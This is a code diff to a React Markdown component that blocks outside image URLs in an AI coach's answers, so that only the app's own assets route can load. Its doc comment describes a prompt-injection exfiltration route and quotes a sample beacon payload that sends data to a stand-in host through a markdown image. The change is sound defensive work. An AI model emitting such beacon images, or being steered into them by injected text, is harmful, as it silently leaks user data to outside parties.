@@ -89,6 +89,20 @@ export interface MarkdownProps {
    * Omitted for markdown that has no assets of its own (a hint, coach feedback).
    */
   assetSlug?: string;
+  /**
+   * Where this markdown came from (ROADMAP P5-10).
+   *
+   * `repo` is content we wrote - statements, hints, editorials - and may embed
+   * images from its own `assets/` directory.
+   *
+   * `coach` is a model's answer, which is influenced by the code in the editor
+   * and by the problem text. `rehype-sanitize` allows any `img src`, so an
+   * injected `![](https://elsewhere/x.png?c=...)` would make the browser fetch
+   * a URL of someone else's choosing the moment the answer painted - a beacon
+   * that needs no click. Images in coach content are therefore dropped unless
+   * they point at this app's own assets route.
+   */
+  trust?: 'repo' | 'coach';
   className?: string;
 }
 
@@ -115,7 +129,10 @@ function image({ alt, ...props }: ComponentProps<'img'>) {
 
 const COMPONENTS = { a: anchor, img: image };
 
-export function Markdown({ content, assetSlug, className }: MarkdownProps) {
+/** The one URL prefix coach content may load an image from. */
+const ASSETS_PREFIX = '/api/problems/';
+
+export function Markdown({ content, assetSlug, trust = 'repo', className }: MarkdownProps) {
   const math = useMathPlugins(content);
 
   const remarkPlugins = math ? [...REMARK_PLUGINS, math.remark] : REMARK_PLUGINS;
@@ -129,8 +146,16 @@ export function Markdown({ content, assetSlug, className }: MarkdownProps) {
         remarkPlugins={remarkPlugins}
         rehypePlugins={rehypePlugins}
         components={COMPONENTS}
-        urlTransform={(url) => {
+        urlTransform={(url, key) => {
           const safe = defaultUrlTransform(url);
+
+          // An image in a model's answer may only come from this app (P5-10).
+          // Links are left alone: a link is a thing the user chooses to follow
+          // and can read before they do.
+          if (trust === 'coach' && key === 'src' && !safe.startsWith(ASSETS_PREFIX)) {
+            return '';
+          }
+
           if (!safe || assetSlug === undefined) return safe;
           // Absolute, root-relative and in-page links are already addresses.
           // Anything else is a file next to the statement, and the only route
